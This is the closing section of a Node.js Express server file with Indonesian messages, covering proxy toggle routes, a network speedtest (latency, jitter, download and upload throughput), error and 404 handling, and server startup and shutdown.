    proxyMetrics.success = 0;
    proxyMetrics.failed = 0;
    proxyMetrics.lastError = null;
    proxyMetrics.lastErrorAt = null;
    proxyMetrics.avgLatencyMs = 0;
    proxyMetrics.samples = 0;
    proxyMetrics.hist = [0, 0, 0, 0, 0, 0, 0];
    res.json({ message: 'Metrics direset' });
  }
);

app.post(
  '/api/proxy/enable',
  disableIfAgent(),
  validateApiKey,
  (req, res) => {
    if (!PROXY_RUNTIME.url) {
      return res.status(400).json({
        error: 'Proxy URL belum diatur. Setel dulu via /api/proxy/config'
      });
    }
    applyProxyConfig({ enabled: true });
    res.json({
      message: 'Proxy enabled',
      enabled: PROXY_RUNTIME.enabled,
      url: PROXY_RUNTIME.url
    });
  }
);

app.post(
  '/api/proxy/disable',
  disableIfAgent(),
  validateApiKey,
  (_req, res) => {
    applyProxyConfig({ enabled: false });
    res.json({
      message: 'Proxy disabled',
      enabled: PROXY_RUNTIME.enabled,
      url: PROXY_RUNTIME.url
    });
  }
);

app.get('/api/proxy/test', validateApiKey, async (_req, res) => {
  try {
    const r = await axiosProxyAware(
      { method: 'get', url: 'http://httpbin.org/ip', timeout: 8000 },
      { useProxy: true }
    );
    res.json({ ok: true, ip: r.data, viaProxy: true });
  } catch (e) {
    res.status(502).json({ ok: false, error: e.message });
  }
});

/* =============================================================================
 * 29) SPEEDTEST ROUTES
 * ========================================================================== */

function makeRandomStream(totalBytes) {
  const chunkSize = 64 * 1024;
  let sent = 0;
  return new Readable({
    read() {
      if (sent >= totalBytes) {
        this.push(null);
        return;
      }
      const size = Math.min(chunkSize, totalBytes - sent);
      const buf = crypto.randomBytes(size);
      sent += size;
      this.push(buf);
    }
  });
}

function calcMbps(bytes, ms) {
  if (!bytes || !ms) return 0;
  const bits = bytes * 8;
  const sec = ms / 1000;
  return Number(((bits / 1_000_000) / (sec || 1)).toFixed(2));
}
function mean(arr) {
  if (!arr.length) return 0;
  return arr.reduce((a, b) => a + b, 0) / arr.length;
}
function stddev(arr) {
  if (arr.length < 2) return 0;
  const m = mean(arr);
  const v = mean(arr.map((x) => (x - m) ** 2));
  return Math.sqrt(v);
}

// Download chunk
app.get('/speedtest/chunk', async (req, res) => {
  const mb = Math.max(1, Math.min(200, Number(req.query.mb) || 10));
  const totalBytes = mb * 1024 * 1024;
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Length', String(totalBytes));
  const stream = makeRandomStream(totalBytes);
  stream.pipe(res);
});

// Upload sink
app.post('/speedtest/upload', async (req, res) => {
  let bytes = 0;
  const start = Date.now();
  await new Promise((resolve, reject) => {
    req.on('data', (chunk) => {
      bytes += chunk.length;
    });
    req.on('end', resolve);
    req.on('error', reject);
  });
  const ms = Date.now() - start;
  const mbps = calcMbps(bytes, ms);
  res.json({ ok: true, bytes, ms, mbps });
});

async function measureDownload({ url, timeout = 30000 }) {
  const start = Date.now();
  let bytes = 0;
  try {
    const resp = await axiosProxyAware(
      {
        method: 'get',
        url,
        responseType: 'stream',
        timeout,
        validateStatus: (s) => s >= 200 && s < 400
      },
      { useProxy: PROXY_RUNTIME.enabled }
    );
    await new Promise((resolve, reject) => {
      resp.data.on('data', (chunk) => {
        bytes += chunk.length;
      });
      resp.data.on('end', resolve);
      resp.data.on('error', reject);
    });
    const dt = Date.now() - start;
    return { ok: true, bytes, ms: dt };
  } catch (e) {
    return { ok: false, error: e.message, bytes, ms: Date.now() - start };
  }
}

async function measureUpload({
  url,
  bytes = 5 * 1024 * 1024,
  timeout = 30000
}) {
  const stream = makeRandomStream(bytes);
  const start = Date.now();
  try {
    const resp = await axiosProxyAware(
      {
        method: 'post',
        url,
        data: stream,
        headers: { 'Content-Type': 'application/octet-stream' },
        timeout,
        maxBodyLength: Infinity,
        maxContentLength: Infinity,
        validateStatus: (s) => s >= 200 && s < 300
      },
      { useProxy: false }
    );
    const dt = Date.now() - start;
    const resBytes = Number(resp.data?.bytes || bytes);
    return { ok: true, bytes: resBytes, ms: dt };
  } catch (e) {
    return { ok: false, error: e.message, bytes: 0, ms: Date.now() - start };
  }
}

app.get('/api/speedtest', validateApiKey, async (req, res) => {
  try {
    const sizeMB = Math.max(1, Math.min(200, Number(req.query.sizeMB) || 10));
    const uploadMB = Math.max(
      1,
      Math.min(100, Number(req.query.uploadMB) || 5)
    );
    const pingSamples = Math.max(
      2,
      Math.min(20, Number(req.query.pingSamples) || 5)
    );
    const timeout = Math.max(
      3000,
      Math.min(120000, Number(req.query.timeout) || 30000)
    );
    const target = req.query.target;

    const baseUrl = MASTER_URL || `http://127.0.0.1:${port}`;
    const latencies = [];
    for (let i = 0; i < pingSamples; i++) {
      const t0 = Date.now();
      try {
        await axiosProxyAware(
          {
            method: 'get',
            url: `${baseUrl}/ping`,
            timeout: 5000,
            validateStatus: () => true
          },
          { useProxy: false }
        ).catch(() => {});
      } catch {}
      latencies.push(Date.now() - t0);
      await waitMs(100);
    }

    const downloadUrl = target || `${baseUrl}/speedtest/chunk?mb=${sizeMB}`;
    const down = await measureDownload({ url: downloadUrl, timeout });

    const up = await measureUpload({
      url: `${baseUrl}/speedtest/upload`,
      bytes: uploadMB * 1024 * 1024,
      timeout
    });

    const latencyAvg = Number(mean(latencies).toFixed(2));
    const jitter = Number(stddev(latencies).toFixed(2));
    const downloadMbps = down.ok ? calcMbps(down.bytes, down.ms) : 0;
    const uploadMbps = up.ok ? calcMbps(up.bytes, up.ms) : 0;

    res.json({
      ok: true,
      viaProxy: PROXY_RUNTIME.enabled,
      proxyUrl: PROXY_RUNTIME.url,
      latencyMsAvg: latencyAvg,
      jitterMs: jitter,
      samples: latencies.length,
      download: {
        ok: down.ok,
        url: downloadUrl,
        bytes: down.bytes,
        durationMs: down.ms,
        mbps: downloadMbps,
        error: down.ok ? null : down.error
      },
      upload: {
        ok: up.ok,
        url: `${baseUrl}/speedtest/upload`,
        bytes: up.bytes,
        durationMs: up.ms,
        mbps: uploadMbps,
        error: up.ok ? null : up.error
      }
    });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

/* =============================================================================
 * 30) GLOBAL ERROR HANDLING, 404, SERVER START, SHUTDOWN
 * ========================================================================== */

// Global errors
process.on('uncaughtException', (err) => {
  console.error('[FATAL] Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason) => {
  console.error('[FATAL] Unhandled Rejection:', reason);
});

// Multer/JSON error handler dan fallback
app.use((err, _req, res, next) => {
  if (err instanceof multer.MulterError) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(413).json({
        error: `Ukuran file terlalu besar. Maks ${METHOD_MAX_FILE_KB}KB.`
      });
    }
    if (err.code === 'LIMIT_UNEXPECTED_FILE') {
      return res.status(400).json({ error: 'Tipe file tidak diizinkan.' });
    }
    return res.status(400).json({ error: `Upload error: ${err.message}` });
  }
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    return res.status(400).json({ error: 'Format JSON tidak valid.' });
  }
  if (err?.message) {
    logActivity('CUSTOM_ERROR_HANDLER', { error: err.message });
    return res.status(400).json({ error: err.message });
  }
  if (err) {
    logActivity('UNKNOWN_ERROR_HANDLER', { error: err.stack || err });
    return res.status(500).json({ error: 'Terjadi kesalahan server.' });
  }
  next();
});

// 404 handler
app.use((req, res) => {
  const notFoundFile = path.join(__dirname, 'web', '404.html');
  if (fs.existsSync(notFoundFile)) res.status(404).sendFile(notFoundFile);
  else res.status(404).json({ error: '404 Not Found' });
});

// Server start
;(async () => {
  try {
    await fetchConfig();
    httpServer
      .listen(port, async () => {
        console.clear();
        let ip = 'localhost';
        try {
          ip = execSync('curl -s ifconfig.me').toString().trim();
        } catch (e) {
          logActivity('IP_FETCH_FAILED', { error: e.message });
        }
        console.log(`SERVER ONLINE: http://${ip}:${port}`);
        logActivity('SERVER_START', { ip, port, nodeType: NODE_TYPE });
        setTimeout(loadPlugins, 1000);
      })
      .on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
          console.error(`Port ${port} sudah digunakan!`);
          process.exit(1);
        }
      });
  } catch (err) {
    console.error('Failed to start server:', err);
    process.exit(1);
  }
})();

// Graceful shutdown
let shuttingDown = false;
async function gracefulShutdown(signal) {
  if (shuttingDown) return;
  shuttingDown = true;
  try {
    await flushAllWrites();
    for (const pluginName in loadedPlugins) {
      try {
        loadedPlugins[pluginName].cleanup?.();
      } catch {}
    }
    logActivity('SHUTDOWN', { signal });
  } finally {
    process.exit(0);
  }
}
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

/* ================================ END OF FILE ================================ */